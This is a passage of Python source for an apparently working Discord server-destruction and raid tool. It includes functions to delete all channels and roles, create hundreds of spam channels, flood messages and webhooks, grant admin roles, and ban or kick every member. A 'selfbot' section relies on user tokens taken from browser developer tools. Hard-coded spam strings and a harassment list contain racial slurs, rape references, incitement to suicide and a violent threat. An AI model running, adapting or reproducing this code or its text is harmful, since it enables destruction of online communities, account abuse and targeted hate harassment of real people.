        return False

async def delete_all_channels_simultaneously(guild):
    """Delete ALL channels in the guild at once"""
    print(f"{Fore.YELLOW}[INFO] Starting mass channel deletion...{Style.RESET_ALL}")
    
    channels = list(guild.channels)
    if not channels:
        print(f"{Fore.YELLOW}[INFO] No channels to delete{Style.RESET_ALL}")
        return 0
    
    print(f"{Fore.YELLOW}[INFO] Deleting {len(channels)} channels...{Style.RESET_ALL}")
    
    delete_tasks = []
    for channel in channels:
        try:
            delete_tasks.append(channel.delete())
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to queue deletion of #{channel.name}: {e}{Style.RESET_ALL}")
    
    if not delete_tasks:
        return 0
    
    results = await asyncio.gather(*delete_tasks, return_exceptions=True)
    
    deleted_count = 0
    failed_count = 0
    
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            failed_count += 1
        else:
            deleted_count += 1
            if deleted_count <= 3:
                channel_name = channels[i].name if i < len(channels) else f"channel_{i}"
                print(f"{Fore.GREEN}[DELETE] Deleted #{channel_name}{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}[SUCCESS] Deleted {deleted_count}/{len(channels)} channels, {failed_count} failed{Style.RESET_ALL}")
    return deleted_count

async def fast_nuke(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Fast Nuke...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
        except discord.Forbidden:
            print(f"{Fore.RED}[ERROR] Bot doesn't have access to this guild!{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    spam = "@everyone officially get fucked by null xd just fuck yourself nigger https://discord.gg/P9kDd7pEBd"
    names = ["NULL-OWNS-THIS", "NULL-RAPED-YALL", "NULL-FUCKS-YOUR-SERVER", "NULL-HERE"]

    # Start ALL operations
    print(f"{Fore.YELLOW}[INFO] Starting nuke operations...{Style.RESET_ALL}")
    
    # 1. Change server name
    try:
        await g.edit(name="Territory of Null")
        print(f"{Fore.GREEN}[SUCCESS] Changed server name{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to change server name: {e}{Style.RESET_ALL}")
    
    # 2. Delete ALL channels
    await delete_all_channels_simultaneously(g)
    
    # 3. Create channels and send messages
    print(f"{Fore.YELLOW}[INFO] Creating channels...{Style.RESET_ALL}")
    
    total_channels = 200
    batch_size = 20
    
    for batch_num in range(0, total_channels, batch_size):
        current_batch_size = min(batch_size, total_channels - batch_num)
        
        create_tasks = []
        for i in range(current_batch_size):
            channel_num = batch_num + i + 1
            name = f"{random.choice(names)}-{channel_num}"
            create_tasks.append(g.create_text_channel(name))
        
        print(f"{Fore.YELLOW}[INFO] Creating batch {batch_num//batch_size + 1}...{Style.RESET_ALL}")
        
        try:
            batch_results = await asyncio.gather(*create_tasks, return_exceptions=True)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to create channels: {e}{Style.RESET_ALL}")
            continue
        
        # Send messages to created channels
        spam_tasks = []
        for i, result in enumerate(batch_results):
            channel_num = batch_num + i + 1
            if isinstance(result, discord.TextChannel):
                ch = result
                
                if channel_num <= 10 or channel_num % 50 == 0:
                    print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
                
                # Send 8 messages per channel
                for msg_num in range(8):
                    spam_tasks.append(ch.send(spam))
        
        # Send messages
        if spam_tasks:
            print(f"{Fore.YELLOW}[INFO] Sending {len(spam_tasks)} messages...{Style.RESET_ALL}")
            try:
                await asyncio.gather(*spam_tasks, return_exceptions=True)
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to send some messages: {e}{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}[SUCCESS] Fast nuke completed!{Style.RESET_ALL}")

async def nuke(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Nuke...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}New server name > ") or "Territory of Null"
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Spam message > ")
    chname = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Channel base name > ") or "null"

    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Start operations
    print(f"{Fore.YELLOW}[INFO] Starting nuke operations...{Style.RESET_ALL}")
    
    # 1. Change server name
    try:
        await g.edit(name=name)
        print(f"{Fore.GREEN}[SUCCESS] Changed server name{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to change server name: {e}{Style.RESET_ALL}")
    
    # 2. Delete ALL channels
    await delete_all_channels_simultaneously(g)
    
    # 3. Create channels and send messages
    total_channels = 200
    batch_size = 20
    
    for batch_num in range(0, total_channels, batch_size):
        current_batch_size = min(batch_size, total_channels - batch_num)
        
        create_tasks = []
        for i in range(current_batch_size):
            channel_num = batch_num + i + 1
            create_tasks.append(g.create_text_channel(f"{chname}-{channel_num}"))
        
        print(f"{Fore.YELLOW}[INFO] Creating batch {batch_num//batch_size + 1}...{Style.RESET_ALL}")
        
        try:
            batch_results = await asyncio.gather(*create_tasks, return_exceptions=True)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to create channels: {e}{Style.RESET_ALL}")
            continue
        
        # Send messages
        spam_tasks = []
        for i, result in enumerate(batch_results):
            channel_num = batch_num + i + 1
            if isinstance(result, discord.TextChannel):
                ch = result
                
                if channel_num <= 10 or channel_num % 50 == 0:
                    print(f"{Fore.GREEN}[CHANNEL] Created #{ch.name}{Style.RESET_ALL}")
                
                # Send 8 messages per channel
                for msg_num in range(8):
                    spam_tasks.append(ch.send(msg))
        
        # Send messages
        if spam_tasks:
            try:
                await asyncio.gather(*spam_tasks, return_exceptions=True)
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Failed to send some messages: {e}{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}[SUCCESS] Nuke completed!{Style.RESET_ALL}")

async def raid(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Raid...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Get text channels
    text_channels = [ch for ch in g.channels if isinstance(ch, discord.TextChannel)]
    print(f"{Fore.YELLOW}[INFO] Found {len(text_channels)} text channels{Style.RESET_ALL}")
    
    if not text_channels:
        print(f"{Fore.YELLOW}[INFO] No text channels found{Style.RESET_ALL}")
        return
    
    # Send messages to ALL text channels SIMULTANEOUSLY
    print(f"{Fore.YELLOW}[INFO] Sending messages to all channels at once...{Style.RESET_ALL}")
    
    # Create all tasks at once
    tasks = []
    for ch_idx, ch in enumerate(text_channels):
        # Send 20 messages per channel
        for msg_idx in range(20):
            tasks.append(ch.send(f"{msg}"))
    
    print(f"{Fore.YELLOW}[INFO] Queued {len(tasks)} messages to send simultaneously...{Style.RESET_ALL}")
    
    if tasks:
        # Send ALL messages at once
        print(f"{Fore.CYAN}[RAID] Sending ALL messages simultaneously...{Style.RESET_ALL}")
        
        try:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            success_count = sum(1 for r in results if not isinstance(r, Exception))
            failed_count = sum(1 for r in results if isinstance(r, Exception))
            
            print(f"{Fore.GREEN}[SUCCESS] Raid completed!{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[INFO] Sent {success_count} messages, {failed_count} failed{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to send messages: {e}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No messages to send{Style.RESET_ALL}")

async def webhook_spam(_):
    print(f"{Fore.YELLOW}[INFO] Starting Webhook Spam...{Style.RESET_ALL}")
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
    
    # Centered options for webhook spam
    print_centered(f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Load webhooks from webhooks.txt")
    print_centered(f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Enter webhooks manually")
    
    choice = input(f"\n{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Select option > ").strip()
    
    urls = []
    
    if choice == "1":
        # Load from file
        try:
            if os.path.exists("webhooks.txt"):
                with open("webhooks.txt", "r", encoding="utf-8") as f:
                    content = f.read()
                    # Split by commas or newlines
                    urls = [url.strip() for url in content.replace(',', '\n').split('\n') if url.strip()]
                print(f"{Fore.GREEN}[SUCCESS] Loaded {len(urls)} webhooks from webhooks.txt{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}[ERROR] webhooks.txt not found!{Style.RESET_ALL}")
                return
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to load webhooks: {e}{Style.RESET_ALL}")
            return
    else:
        # Manual input
        urls_input = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook URLs (comma or newline separated) > ")
        urls = [url.strip() for url in urls_input.replace(',', '\n').split('\n') if url.strip()]
    
    if not urls:
        print(f"{Fore.RED}[ERROR] No webhook URLs provided!{Style.RESET_ALL}")
        return
    
    msg = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Message > ")
    
    print(f"{Fore.YELLOW}[INFO] Found {len(urls)} webhook URLs{Style.RESET_ALL}")

    async with aiohttp.ClientSession() as session:
        # First validate all webhooks
        valid_webhooks = []
        for url_idx, url in enumerate(urls):
            try:
                wh = discord.Webhook.from_url(url, session=session)
                valid_webhooks.append(wh)
                print(f"{Fore.GREEN}[WEBHOOK] Webhook {url_idx+1} is valid{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Invalid webhook URL {url_idx+1}: {e}{Style.RESET_ALL}")
        
        if not valid_webhooks:
            print(f"{Fore.YELLOW}[INFO] No valid webhooks found{Style.RESET_ALL}")
            return
        
        # Create spam tasks
        tasks = []
        for wh_idx, wh in enumerate(valid_webhooks):
            # Send 30 messages per webhook
            for msg_idx in range(30):
                tasks.append(wh.send(msg, wait=False))
        
        print(f"{Fore.YELLOW}[INFO] Sending {len(tasks)} webhook messages...{Style.RESET_ALL}")
        
        # Send in batches
        batch_size = 50
        total_sent = 0
        
        for i in range(0, len(tasks), batch_size):
            batch = tasks[i:i+batch_size]
            print(f"{Fore.CYAN}[WEBHOOK] Sending batch {i//batch_size + 1} ({len(batch)} messages)...{Style.RESET_ALL}")
            
            try:
                results = await asyncio.gather(*batch, return_exceptions=True)
                batch_success = sum(1 for r in results if not isinstance(r, Exception))
                total_sent += batch_success
                print(f"{Fore.GREEN}[WEBHOOK] Batch {i//batch_size + 1}: Sent {batch_success} messages{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[ERROR] Batch failed: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[SUCCESS] Webhook spam completed! Sent {total_sent} messages{Style.RESET_ALL}")

async def webhook_flood(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Webhook Flood...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Webhook name > ") or "null"
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Get ALL text channels with webhook permissions
    text_channels = []
    for ch in g.channels:
        if isinstance(ch, discord.TextChannel):
            # Check if bot has permission to create webhooks
            try:
                if ch.permissions_for(g.me).manage_webhooks:
                    text_channels.append(ch)
            except:
                continue
    
    print(f"{Fore.YELLOW}[INFO] Found {len(text_channels)} text channels with webhook permissions{Style.RESET_ALL}")
    
    if not text_channels:
        print(f"{Fore.RED}[ERROR] No channels with webhook creation permissions found!{Style.RESET_ALL}")
        return
    
    urls = []
    created_webhooks = []
    
    # Create webhooks in ALL channels
    for ch_idx, ch in enumerate(text_channels):
        print(f"{Fore.YELLOW}[INFO] Creating webhooks in channel #{ch.name}...{Style.RESET_ALL}")
        
        try:
            # Create 5 webhooks per channel
            for wh_idx in range(5):
                webhook_name = f"{name}-{ch_idx+1}-{wh_idx+1}"
                try:
                    webhook = await ch.create_webhook(name=webhook_name)
                    urls.append(webhook.url)
                    created_webhooks.append(webhook)
                    print(f"{Fore.GREEN}[WEBHOOK] Created: {webhook.name} in #{ch.name}{Style.RESET_ALL}")
                except discord.HTTPException as e:
                    if e.status == 429:  # Rate limit
                        print(f"{Fore.YELLOW}[WARNING] Rate limited, waiting 5 seconds...{Style.RESET_ALL}")
                        await asyncio.sleep(5)
                        # Retry once
                        try:
                            webhook = await ch.create_webhook(name=webhook_name)
                            urls.append(webhook.url)
                            created_webhooks.append(webhook)
                            print(f"{Fore.GREEN}[WEBHOOK] Created: {webhook.name} in #{ch.name}{Style.RESET_ALL}")
                        except:
                            print(f"{Fore.RED}[ERROR] Failed to create webhook after retry{Style.RESET_ALL}")
                    else:
                        print(f"{Fore.RED}[ERROR] Failed to create webhook: {e}{Style.RESET_ALL}")
                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Failed to create webhook: {e}{Style.RESET_ALL}")
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to process channel #{ch.name}: {e}{Style.RESET_ALL}")
    
    # Save webhooks to file
    if urls:
        try:
            # Create comma-separated string
            urls_text = ",".join(urls)
            with open("webhooks.txt", "w", encoding="utf-8") as f:
                f.write(urls_text)
            print(f"{Fore.GREEN}[SUCCESS] Saved {len(urls)} webhooks to webhooks.txt{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[INFO] You can use these webhooks with the 'Webhook spam' option{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to save webhooks: {e}{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No webhooks were created{Style.RESET_ALL}")

async def role_delete(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Role Delete...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Get roles to delete
    roles_to_delete = [r for r in g.roles if r != g.default_role and not r.managed]
    print(f"{Fore.YELLOW}[INFO] Found {len(roles_to_delete)} roles to delete{Style.RESET_ALL}")
    
    if roles_to_delete:
        print(f"{Fore.YELLOW}[INFO] Deleting roles...{Style.RESET_ALL}")
        
        # Delete in batches
        batch_size = 10
        deleted_count = 0
        
        for i in range(0, len(roles_to_delete), batch_size):
            batch = roles_to_delete[i:i+batch_size]
            print(f"{Fore.CYAN}[ROLE] Deleting batch {i//batch_size + 1}...{Style.RESET_ALL}")
            
            tasks = [r.delete() for r in batch]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for j, result in enumerate(results):
                role_idx = i + j
                if not isinstance(result, Exception) and role_idx < len(roles_to_delete):
                    role_name = roles_to_delete[role_idx].name
                    deleted_count += 1
                    if deleted_count <= 5:
                        print(f"{Fore.GREEN}[ROLE] Deleted role: {role_name}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[SUCCESS] Role deletion completed! Deleted {deleted_count}/{len(roles_to_delete)} roles{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No roles to delete{Style.RESET_ALL}")

async def role_spam(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Role Spam...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    name = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Role name > ") or "NULL"
    admin = input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Admin? (y/n) > ").lower().startswith('y')

    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    perms = discord.Permissions(administrator=admin)
    print(f"{Fore.YELLOW}[INFO] Creating first role...{Style.RESET_ALL}")
    try:
        first = await g.create_role(name=name, permissions=perms)
        print(f"{Fore.GREEN}[ROLE] Created role: {first.name}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Failed to create first role: {e}{Style.RESET_ALL}")
        return
    
    # Get members
    members = [m for m in g.members if not m.bot]
    print(f"{Fore.YELLOW}[INFO] Found {len(members)} members to add role to{Style.RESET_ALL}")
    
    if members:
        print(f"{Fore.YELLOW}[INFO] Adding role to members...{Style.RESET_ALL}")
        
        # Add role in batches
        batch_size = 20
        added_count = 0
        
        for i in range(0, len(members), batch_size):
            batch = members[i:i+batch_size]
            print(f"{Fore.CYAN}[ROLE] Adding role to batch {i//batch_size + 1}...{Style.RESET_ALL}")
            
            tasks = [m.add_roles(first) for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            added_count += len(batch)
        
        print(f"{Fore.GREEN}[SUCCESS] Added role to {added_count}/{len(members)} members{Style.RESET_ALL}")

    print(f"{Fore.YELLOW}[INFO] Creating additional roles...{Style.RESET_ALL}")
    
    # Create additional roles
    total_roles = 50
    batch_size = 10
    created_count = 0
    
    for i in range(0, total_roles, batch_size):
        current_batch = min(batch_size, total_roles - i)
        print(f"{Fore.CYAN}[ROLE] Creating batch {i//batch_size + 1}...{Style.RESET_ALL}")
        
        tasks = [g.create_role(name=f"{name}-{i+j}") for j in range(current_batch)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if not isinstance(result, Exception):
                created_count += 1
    
    print(f"{Fore.GREEN}[SUCCESS] Role spam completed! Created {created_count} additional roles{Style.RESET_ALL}")

async def ban_all(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Ban All...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Get members to ban
    members_to_ban = [m for m in g.members if m != g.me]
    print(f"{Fore.YELLOW}[INFO] Found {len(members_to_ban)} members to ban{Style.RESET_ALL}")
    
    if members_to_ban:
        print(f"{Fore.YELLOW}[INFO] Banning members...{Style.RESET_ALL}")
        
        # Ban in batches
        batch_size = 10
        banned_count = 0
        
        for i in range(0, len(members_to_ban), batch_size):
            batch = members_to_ban[i:i+batch_size]
            print(f"{Fore.CYAN}[BAN] Banning batch {i//batch_size + 1}...{Style.RESET_ALL}")
            
            tasks = [m.ban(reason="null xd", delete_message_days=0) for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            banned_count += len(batch)
        
        print(f"{Fore.GREEN}[SUCCESS] Ban all completed! Banned {banned_count}/{len(members_to_ban)} members{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No members to ban{Style.RESET_ALL}")

async def kick_all(bot):
    print(f"{Fore.YELLOW}[INFO] Starting Kick All...{Style.RESET_ALL}")
    
    try:
        gid = int(input(f"{get_color('light')}[?]{Style.RESET_ALL} {Fore.WHITE}Server ID > "))
    except ValueError:
        print(f"{Fore.RED}[ERROR] Invalid server ID!{Style.RESET_ALL}")
        return
    
    # Try to fetch guild
    g = bot.get_guild(gid)
    if not g:
        print(f"{Fore.YELLOW}[INFO] Guild not in cache, fetching from API...{Style.RESET_ALL}")
        try:
            g = await bot.fetch_guild(gid)
        except discord.NotFound:
            print(f"{Fore.RED}[ERROR] Guild not found! Make sure the bot is in this server.{Style.RESET_ALL}")
            return
    
    print(f"{Fore.GREEN}[SUCCESS] Found guild: {g.name} (ID: {g.id}){Style.RESET_ALL}")
    
    # Get members to kick
    members_to_kick = [m for m in g.members if m != g.me]
    print(f"{Fore.YELLOW}[INFO] Found {len(members_to_kick)} members to kick{Style.RESET_ALL}")
    
    if members_to_kick:
        print(f"{Fore.YELLOW}[INFO] Kicking members...{Style.RESET_ALL}")
        
        # Kick in batches
        batch_size = 10
        kicked_count = 0
        
        for i in range(0, len(members_to_kick), batch_size):
            batch = members_to_kick[i:i+batch_size]
            print(f"{Fore.CYAN}[KICK] Kicking batch {i//batch_size + 1}...{Style.RESET_ALL}")
            
            tasks = [m.kick(reason="null owns") for m in batch]
            await asyncio.gather(*tasks, return_exceptions=True)
            kicked_count += len(batch)
        
        print(f"{Fore.GREEN}[SUCCESS] Kick all completed! Kicked {kicked_count}/{len(members_to_kick)} members{Style.RESET_ALL}")
    else:
        print(f"{Fore.YELLOW}[INFO] No members to kick{Style.RESET_ALL}")

# ────────────────────────────────────────────────────────────────────────────────
#   SELFBOT CATEGORY - USES USER TOKENS ONLY (STRICTLY USER TOKENS)
# ────────────────────────────────────────────────────────────────────────────────

SELFBOT_ASCII_LINES = [
    "                      ..:::::::::::::..",
    "                .:::::''              ``:::.",
    "              .:;'                        `::.",
    "           ..::'                            `::.",
    "          ::'                                  ::.:'",
    "      `::.::                                    ::.",
    "    .::::::::'                                `:.:::.    .:':'",
    ":::::::::::::.          .:.                .:. ` ::::::::::::'",
    ":::.::::::::::::'       :::                :::    :::::::::':::",
    "..::::::::::::'          ' `                ' `   .::::::' :::'",
    "::::::::::::'  `:.   .:::::::.          .:::::::.:: .:' :'.::'",
    "::::::::::::    `::.::'     `::.      .::'     `::.::':'.:::",
    "::::::::::::      .::'        `:;  . .::'        `:;:'.::''",
    ":::::::::::'.     ::'    .    .:: :  ::'    .    .:::::''",
    ":`::::::::::::.:  `::.  :O: .::;' :  `::.  :O: .::;'::'",
    "   `::::::`::`:.    `:::::::::'   :.   `:::::::::':'''",
    "       `````:`::.     , .         `:.        , . `::.",
    "            :: `::.   :::      ..::::::::..  :::  `::",
    "      .::::'::. `::.  `:'     :::::::::::::; `:'   :;",
    "            ::'    ::.   .::'  ``:::::::;'' :.   .:'",
    "            `::    `::  ::'        ::       .::  :'",
    "             ::.    :'.::::::.    :  :   .::::. .:::.",
    ":.           `::.     :::'  ``::::. .::::'' `::::' `::.",
    "`::.          `::.    `:::. ::.  `::::' .:: ::::;    `::",
    ":.`:.          `::.     `::. `:::.    .::'  ::;'     .:;.",
    " ::`::.          `::.     `::.  `::. .::' .:;':'     :;':.",
    "::':``:::::.       `::.     `::. `::::'  .:;':'     .;':':",
    ": .:`:::':`:::::.   `::.      `:::.   .::;'.:'  .::;'' ';:",
    "..::': :. ::::. `::::::`::..      `:::::'  .:':::'::.:: :':",
    ":' :'.:::. `:: :: ::. .::`::.   .     . .:;':' ::'`:: :::'",
    ": ::.:. `:  `::'  `:: ::'::`::::::::::::;' :: .:' .::: ;:'",
    "::.::.:::: .:: :.  `:':'  ::.:'`::. .::':.::' :: .::''::'",
    "`:::`::.`:.::' ::  .: ::  `::'  `:: :' .::' ::.:.::' :;",
    "   `::::::.`:. .:. :: `::.:: ::  `::. .:: ::.`:::':.:;'",
    "         `::::::::::...:::'  `::.:'`:.::'.:.:;' .:;'",
    "                    `::::::::::::::::::::'.::;:;'",
    "",
    "▓█████▄  ██▓▓█████    ",
    "▒██▀ ██▌▓██▒▓█   ▀    ",
    "░██   █▌▒██▒▒███      ",
    "░▓█▄   ▌░██░▒▓█  ▄    ",
    "░▒████▓ ░██░░▒████▒   ",
    " ▒▒▓  ▒ ░▓  ░░ ▒░ ░   ",
    " ░ ▒  ▒  ▒ ░ ░ ░  ░   ",
    " ░ ░  ░  ▒ ░   ░      ",
    "   ░     ░     ░  ░   ",
    " ░                     "
]

def display_selfbot_ascii():
    """Display Selfbot ASCII art"""
    clear_console()
    for i, line in enumerate(SELFBOT_ASCII_LINES):
        color = get_gradient_color(i, len(SELFBOT_ASCII_LINES))
        print_color_centered(line, color)
    print_color_centered("made by @uekv on discord", get_gradient_color(len(SELFBOT_ASCII_LINES)+1, len(SELFBOT_ASCII_LINES)+2))
    print_color_centered("─"*60, get_gradient_color(len(SELFBOT_ASCII_LINES)+2, len(SELFBOT_ASCII_LINES)+3))

def display_selfbot_menu():
    """Display Selfbot main menu"""
    display_selfbot_ascii()
    print_centered(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Selfbot Menu (USER TOKENS ONLY){Style.RESET_ALL}")
    print_centered(f"{get_color('medium')}[!]{Style.RESET_ALL} {Fore.YELLOW}This category requires USER tokens ONLY from browser Developer Tools{Style.RESET_ALL}")
    print_centered(f"{get_color('light')}[-]{Style.RESET_ALL} {Fore.RED}BOT TOKENS WILL BE REJECTED HERE{Style.RESET_ALL}")
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}\n")
    
    options = [
        f"{get_color('light')}[1]{Style.RESET_ALL}{Fore.WHITE} Setup wizard",
        f"{get_color('light')}[2]{Style.RESET_ALL}{Fore.WHITE} Start bots",
        f"{get_color('light')}[3]{Style.RESET_ALL}{Fore.WHITE} Stop bots",
        f"{get_color('light')}[4]{Style.RESET_ALL}{Fore.WHITE} Status",
        f"{get_color('light')}[0]{Style.RESET_ALL}{Fore.WHITE} ← Back"
    ]
    
    for opt in options:
        print_centered(opt)
    
    print_centered(f"\n{get_color('medium')}{'─' * 60}{Style.RESET_ALL}")
    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select > ", end="")
    return input().strip()

# Selfbot configuration
selfbot_running = False
running_bots = []
copycat_users = set()
current_prefix = "."

BEEF_LINES = [
    "UR FUCKING UGLY AND ASS",
    "WEAK ASS NIGGA",
    "SHUT TEH FUCK UP",
    "TRASH ASS PUSSY",
    "UR TRASH A FUKC",
    "GABRGAE ASS CUCK",
    "LMFAO UR SO ASS",
    "UR A WEAK ASS PUSYSUR SO ASS",
    "LMFAO UR SO TRASH DONT DIE TO ME",
    "UR MY FUCKING BITCH UR ULY",
    "UR A WEK ASS PUSSY",
    "DONT FOLD TO ME",
    "LETS BOX PUSSY",
    "UR SO FUCKING TRASH KILL URSELF JR",
    "UR UR SO MAD",
    "LMFAO I WILL BLOW UR HEAD OFF",
    "UR A FUCKING TRASH ASS PUSSY",
    "UR WEAK ASS FUCK",
    "UR A DORK ASS NIGA",
    "UR SO MAD LFMAO UR SO UGLY",
